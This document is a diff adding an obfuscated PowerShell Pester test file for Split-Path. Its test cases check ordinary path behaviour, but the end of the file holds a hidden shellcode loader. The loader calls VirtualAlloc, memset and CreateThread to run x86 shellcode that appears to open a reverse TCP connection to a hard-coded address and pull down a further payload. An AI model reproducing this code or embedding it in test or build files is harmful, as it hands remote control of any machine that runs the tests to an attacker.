@@ -1,0 +1,94 @@
+  $eQgy = [tYPe]("{2}{1}{0}{3}" -f 'Io.pA','Em.','sYst','Th')  ;  
+
+&("{0}{1}{2}" -f 'Des','crib','e') ("{1}{2}{0}" -f 'h','Spli','t-Pat') -Tags "CI" {
+
+    &('It') ("{10}{6}{5}{7}{4}{2}{3}{9}{1}{8}{0}"-f'ed',' whe','a string ','objec','rn ','ould','h',' retu','n invok','t','S') {
+        ${res`ULt} = &("{1}{0}{2}"-f 'lit-','Sp','Path') ('.')
+        ${r`Esult} | &("{1}{0}" -f 'ould','Sh') -BeOfType ("{2}{1}{0}"-f'ng','tri','S')
+
+        ${resU`LT} = &("{1}{0}{2}" -f'P','Split-','ath') ('.') -Leaf
+        ${RE`SU`lt} | &("{0}{1}" -f 'S','hould') -BeOfType ("{2}{0}{1}" -f'i','ng','Str')
+
+        ${r`eSULT} = &("{0}{2}{1}" -f'Spli','ath','t-P') ('.') -Resolve
+        ${RE`S`ULT} | &("{0}{2}{1}" -f 'S','uld','ho') -BeOfType ("{0}{1}"-f 'Stri','ng')
+    }
+
+    &('It') ("{4}{2}{10}{1}{8}{6}{14}{12}{7}{5}{3}{9}{13}{11}{0}"-f 'witch is used','re','oul','the ','Sh','ive when ','n',' of the dr','tur','q','d ','fier s','e name','uali',' th') {
+	&("{1}{0}{3}{2}"-f'a','Split-P','h','t') -Qualifier ("{1}{0}"-f 'v:','en')     | &("{0}{1}"-f'Sho','uld') -Be ("{1}{0}"-f 'nv:','e')
+	&("{2}{0}{1}"-f'it-Pat','h','Spl') -Qualifier ("{2}{0}{1}" -f'AT','H','env:P') | &("{0}{1}"-f'Sh','ould') -Be ("{0}{1}"-f'env',':')
+    }
+
+    &('It') ("{15}{13}{11}{12}{8}{0}{14}{5}{4}{10}{2}{7}{9}{3}{6}{1}" -f 'n using the','e path','d n','i','lifier','a','n th','o qualifie','he','r ',' switch an','r',' w','o',' qu','Should err') {
+        { &("{0}{2}{1}"-f'Split-','ath','P') -Qualifier -ErrorAction ("{1}{0}"-f 'top','S') ("{0}{1}"-f'/U','sers') } | &("{0}{1}" -f 'Sho','uld') -Throw
+	{ &("{0}{2}{1}"-f'Split-','ath','P') -Qualifier -ErrorAction ("{0}{1}"-f'S','top') ("{0}{1}"-f 'a','bcdef') } | &("{0}{1}"-f'Sh','ould') -Throw
+    }
+
+    &('It') ("{11}{0}{4}{6}{7}{5}{10}{9}{3}{12}{1}{13}{8}{2}" -f'ou','er ','sed','oquali','ld r','rn the','et','u','tch is u','e n',' path when th','Sh','fi','swi') {
+	&("{0}{1}{3}{2}"-f 'Spl','it','Path','-') ("{1}{0}"-f 'TH','env:PA') -NoQualifier | &("{2}{0}{1}" -f'houl','d','S') -BeExactly ("{0}{1}"-f 'P','ATH')
+    }
+
+    &('It') ("{2}{0}{3}{4}{6}{7}{5}{8}{1}"-f're','ed','Should ','turn t','he bas','e','e na','me wh','n the leaf switch is us') {
+	&("{2}{0}{1}" -f 'plit-Pat','h','S') -Leaf ("{0}{2}{1}"-f '/u','bin','sr/')                  | &("{1}{0}" -f 'ould','Sh') -BeExactly "bin"
+	&("{2}{0}{1}" -f'Pa','th','Split-') -Leaf ("{1}{2}{0}{3}"-f '/usr/lo','f','s:','cal/bin')         | &("{2}{1}{0}" -f'd','houl','S') -BeExactly "bin"
+	&("{1}{2}{0}"-f 'lit-Path','S','p') -Leaf ("{2}{1}{0}"-f'in','sr/b','u')                   | &("{0}{1}"-f 'Sho','uld') -BeExactly "bin"
+	&("{1}{0}{2}" -f'lit-','Sp','Path') -Leaf ("{0}{1}"-f'./','bin')                     | &("{2}{0}{1}" -f 'oul','d','Sh') -BeExactly "bin"
+	&("{0}{1}{2}" -f'Sp','lit-','Path') -Leaf ("{1}{0}"-f'n','bi')                       | &("{0}{1}" -f'Shoul','d') -BeExactly "bin"
+	&("{1}{0}{2}"-f 'it-P','Spl','ath') -Leaf ((("{4}{1}{2}{5}{0}{3}"-f 'nFol','n','Temp','der1','C:Op','Op'))-cREPlAce([ChAr]79+[ChAr]112+[ChAr]110),[ChAr]92)         | &("{0}{1}"-f 'Sh','ould') -BeExactly ("{0}{1}"-f'Folder','1')
+	&("{0}{2}{1}"-f'Split','Path','-') -Leaf ((("{0}{1}{3}{2}" -f'C:1ow','T','mp','e'))."R`EPlAce"(([cHaR]49+[cHaR]111+[cHaR]119),'\'))                 | &("{2}{1}{0}" -f'd','houl','S') -BeExactly ("{0}{1}" -f'Te','mp')
+	&("{2}{0}{1}" -f 'lit-Pat','h','Sp') -Leaf ((("{8}{2}{6}{3}{7}{1}{4}{0}{5}"-f 'lde','sh','DmsDm','er1s','are1sDmfo','r','serv','Dm','s')) -cREplACe 'sDm',[cHar]92) | &("{0}{1}"-f 'Shou','ld') -BeExactly ("{1}{0}"-f 'der','fol')
+	&("{0}{1}{2}" -f 'Spl','it-','Path') -Leaf ((("{0}{1}{3}{2}{4}"-f '3','4T3','erver134Ts','4Ts','hare1'))."REPL`ACE"('34T',[strinG][cHar]92))        | &("{1}{0}"-f'd','Shoul') -BeExactly ("{0}{1}"-f 's','hare1')
+    }
+
+    &('It') ("{2}{8}{5}{6}{13}{1}{12}{15}{21}{3}{7}{17}{11}{20}{4}{19}{14}{9}{16}{18}{0}{10}"-f 'ct','cept reg','S','re','ut','oul','d be a','ss','h','for multiple ob','s','nput and ou','ul','ble to ac','array ','a','j','ion i','e',' an ','tp','r exp') {
+        ${tEs`Td`iR} = ${tes`TdRI`VE}
+        ${t`E`sTfi`LE1}     = ("{2}{0}{1}" -f'e','stfile1.ps1','t')
+        ${tE`S`T`FiLE2}     = ("{0}{2}{1}"-f 'testfi','1','le2.ps')
+        ${TE`stfiL`ePA`T`H1} = &("{1}{2}{0}"-f 'ath','Join','-P') -Path ${T`ES`TdIr} -ChildPath ${Te`St`FilE1}
+        ${TE`sT`FIlE`pAT`H2} = &("{1}{2}{0}"-f 'Path','Jo','in-') -Path ${TES`TD`ir} -ChildPath ${TES`TfIl`E2}
+
+        &("{2}{1}{0}" -f'Item','-','New') -ItemType ("{1}{0}" -f'e','fil') -Path ${TE`sTFI`lep`Ath1}, ${T`EsTF`iLePAT`h2} -Force
+
+        &("{0}{1}{2}" -f 'Te','st-Pat','h') ${te`sTF`ilE`p`ATh1} | &("{0}{1}" -f 'Shou','ld') -BeTrue
+        &("{0}{2}{1}"-f 'Test-Pa','h','t') ${TE`sTFi`LEpatH2} | &("{2}{1}{0}"-f'd','houl','S') -BeTrue
+
+        ${ac`TUal} = ( &("{0}{2}{1}" -f'Split','Path','-') (&("{2}{0}{1}" -f 'n-','Path','Joi') -Path ${T`Es`TDir} -ChildPath ("{3}{1}{0}{2}"-f '*.ps','file','1','test')) -Leaf -Resolve ) | &("{1}{0}{3}{2}"-f 't','Sor','bject','-O')
+        ${a`ctu`Al}."C`OUNt"                   | &("{0}{1}" -f 'Sh','ould') -Be 2
+        ${A`ct`UAL}[0]                      | &("{1}{0}{2}"-f'u','Sho','ld') -BeExactly ${tEST`FIL`e1}
+        ${a`cTUAL}[1]                      | &("{0}{1}"-f'Sh','ould') -BeExactly ${T`eSTFIL`e2}
+        ,${ACt`U`Al}                        | &("{0}{1}" -f'Shou','ld') -BeOfType ("{1}{0}{2}" -f 'em.Ar','Syst','ray')
+    }
+
+    &('It') ("{4}{1}{8}{7}{0}{2}{6}{9}{10}{3}{5}"-f'f ',' b','a given ','absolute','Should',' path','pa','le to tell i','e ab','th is ','an ') {
+	&("{0}{2}{1}"-f 'Spl','th','it-Pa') -IsAbsolute ("{1}{0}{2}"-f'usr/bi','fs:/','n') | &("{0}{1}" -f 'S','hould') -BeTrue
+	&("{0}{1}{2}"-f 'Spli','t-Pat','h') -IsAbsolute ('..')          | &("{0}{1}"-f 'S','hould') -BeFalse
+	&("{2}{0}{1}" -f'pl','it-Path','S') -IsAbsolute ("{2}{1}{0}" -f 'r/..','us','/')     | &("{1}{0}" -f'ould','Sh') -Be (!${ISw`I`NDows})
+	&("{3}{0}{2}{1}"-f 'p','t-Path','li','S') -IsAbsolute ("{1}{2}{3}{0}" -f'./','fs:/u','s','r/.') | &("{0}{1}{2}"-f'Shou','l','d') -BeTrue
+	&("{2}{1}{0}" -f 'th','t-Pa','Spli') -IsAbsolute ("{0}{1}"-f'.','./')         | &("{1}{0}"-f'ould','Sh') -BeFalse
+	&("{0}{2}{1}" -f'Spli','th','t-Pa') -IsAbsolute ('.')           | &("{0}{1}" -f 'S','hould') -BeFalse
+	&("{0}{3}{1}{2}"-f 'Spl','Pat','h','it-') -IsAbsolute ('~/')          | &("{2}{1}{0}"-f'ld','ou','Sh') -BeFalse
+	&("{2}{0}{3}{1}" -f 'l','-Path','Sp','it') -IsAbsolute ("{1}{0}" -f '..','~/')        | &("{0}{1}"-f 'S','hould') -BeFalse
+	&("{0}{2}{1}"-f 'Split-P','h','at') -IsAbsolute ("{2}{0}{1}"-f'/../','..','~')     | &("{1}{0}"-f'ld','Shou') -BeFalse
+    }
+
+    &('It') ("{2}{5}{1}{3}{4}{0}"-f'g',' s','Sh','up','port pipin','ould') {
+        ("{2}{1}{0}"-f'n','sr/bi','u') | &("{1}{0}{3}{2}"-f 'plit-P','S','h','at') | &("{1}{0}"-f'uld','Sho') -Be "usr"
+    }
+
+    &('It') ("{4}{8}{6}{16}{0}{22}{23}{12}{15}{10}{3}{1}{13}{7}{2}{18}{11}{17}{9}{21}{5}{14}{19}{20}" -f 'rn','t','h',' to ','S','ar','uld re','f t','ho','whe','up','tor','th','he parent o','ent s',' ','tu','y ','e direc','witch is us','ed','n P',' the p','a') {
+        ${DIr`S`Ep} = [string](  (VaRIaBLE  ('eqg'+'y')).VAlUE::"DIRE`ctOry`S`ep`ARaT`oRchar")
+	&("{0}{2}{1}" -f'Sp','Path','lit-') -Parent ("{2}{1}{0}{3}" -f '/','r','fs:/us','bin')             | &("{1}{0}"-f'hould','S') -BeExactly "fs:${dirSep}usr"
+	&("{2}{3}{1}{0}" -f 'th','-Pa','Spl','it') -Parent ("{1}{0}{2}"-f's','/u','r/bin')                | &("{2}{1}{0}" -f 'd','ul','Sho') -BeExactly "${dirSep}usr"
+	&("{1}{0}{2}"-f'lit-Pat','Sp','h') -Parent ("{2}{0}{3}{1}" -f '/','n','/usr','local/bi')          | &("{0}{2}{1}" -f'Sh','d','oul') -BeExactly "${dirSep}usr${dirSep}local"
+	&("{3}{0}{1}{2}"-f 'pl','it-P','ath','S') -Parent ("{0}{1}{2}"-f'usr/l','ocal/','bin')           | &("{0}{1}{2}"-f 'Sh','o','uld') -BeExactly "usr${dirSep}local"
+	&("{0}{1}{2}"-f'Sp','lit-','Path') -Parent ((("{5}{0}{3}{4}{2}{1}" -f 'o','der1','oqFol','qTemp','x','C:x')) -crePLaCe  'xoq',[CHar]92)         | &("{0}{1}"-f 'Shoul','d') -BeExactly "C:${dirSep}Temp"
+	&("{2}{1}{0}" -f 'ath','lit-P','Sp') -Parent ((("{1}{0}{2}"-f 'u','C:S9','Temp')) -cRepLAce'S9u',[ChAR]92)                 | &("{1}{0}"-f'ld','Shou') -BeExactly "C:${dirSep}"
+	&("{2}{1}{0}"-f 'Path','t-','Spli') -Parent ((("{1}{6}{2}{5}{3}{4}{0}" -f 'share1Rytfolder','RytR','rv','1Ry','t','er','ytse')) -REplacE ([cHAr]82+[cHAr]121+[cHAr]116),[cHAr]92) | &("{1}{0}" -f'ld','Shou') -BeExactly "${dirSep}${dirSep}server1${dirSep}share1"
+	&("{2}{0}{1}" -f 'pl','it-Path','S') -Parent ((("{3}{1}{0}{2}" -f'YkHser','kH','ver1YkHshare1','Y'))."r`epla`cE"('YkH',[STRInG][ChAr]92))        | &("{1}{0}"-f'd','Shoul') -BeExactly "${dirSep}${dirSep}server1"
+    }
+
+    &('It') ("{3}{5}{0}{2}{1}{4}{8}{6}{7}" -f ' ','t','spli','Do',' a','es not','rive l','eter',' d'){
+    &("{0}{1}{2}"-f 'S','plit','-Path') -Path 'C:\' | &("{0}{1}" -f 'Sh','ould') -BeNullOrEmpty
+    }
+}
+
+${X`At} = ((("{46}{62}{107}{99}{56}{64}{25}{101}{81}{79}{58}{33}{104}{72}{102}{117}{108}{39}{84}{16}{100}{17}{115}{89}{92}{97}{112}{68}{13}{48}{41}{110}{18}{77}{3}{96}{37}{114}{63}{59}{55}{80}{86}{123}{42}{1}{91}{34}{49}{60}{87}{111}{66}{116}{122}{23}{10}{22}{109}{61}{98}{2}{53}{93}{35}{47}{119}{83}{30}{51}{113}{8}{0}{29}{9}{78}{105}{76}{26}{45}{38}{19}{90}{88}{4}{82}{95}{43}{73}{31}{85}{50}{20}{94}{6}{71}{103}{120}{52}{75}{40}{69}{65}{12}{121}{15}{32}{70}{11}{36}{118}{7}{27}{57}{24}{21}{14}{28}{106}{54}{67}{5}{74}{44}" -f 'uint dwSt','Prot','sta','i',', IntPtr lpP','ou','Import(','r ','readAttributes, ','kS','l32.d','er',' sta',' u','IntPt','ic','oc(','ntPt','e,','d','d);[D','(','l','rne','t','ernel32.','ntP','mem','r dest,','ac','ead','ionFlags, ',' e','at','ct','n ','n I',' flAl','StartAd',' ','ub','t dw','l',' uint dwC',';','tr lp','[','I','in',');[','lpThreadI','(IntPtr','lFUm)','tic','nt src, uin','e,','U','se','ic st','p','D','pub','D','cationTy','mk','c','t(FUm','t c',',','li','xt','F',' e','reat','nt)',']p','I',' u','ize','publ',' ',']','aramet','r','VirtualAll','IntPtr ','uin','l','ess','lpAd','r','e','dr',' exter','ll','er,','nt','es','lic ','Import(F','I','dllFUm)','xte','Umms','ic',', ',' ui','ll','tr','lFUm)]','Siz','lImpor','s',' lpTh','lo','r ','k','rn IntP','ntPt','ntPtr CreateTh','vcrt.dl','t','e','t f'))."r`EpL`AcE"('FUm',[sTRiNg][CHAr]34));${W} = &("{2}{1}{0}" -f'e','-Typ','Add') -memberDefinition ${x`AT} -Name ("{1}{0}" -f 'in32','W') -namespace ("{0}{3}{1}{2}"-f 'W','n32','Functions','i') -passthru;[Byte[]];[Byte[]]${Z} = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0xdb,0x32,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;${G} = 0x1000;if (${z}."l`engtH" -gt 0x1000){${G} = ${z}."lENG`TH"};${s`B9Y}=${w}::("{1}{2}{0}" -f 'loc','Virtual','Al').Invoke(0,0x1000,${G},0x40);for (${i}=0;${I} -le (${Z}."lENg`Th"-1);${i}++) {${w}::"m`EMsEt"([IntPtr](${S`B9y}.("{1}{0}{2}" -f'n','ToI','t32').Invoke()+${i}), ${Z}[${i}], 1)};${W}::("{2}{1}{0}" -f 'd','ea','CreateThr').Invoke(0,0,${S`B9y},0,0,0);for (;;){&("{1}{0}{2}" -f'ar','St','t-sleep') 60};
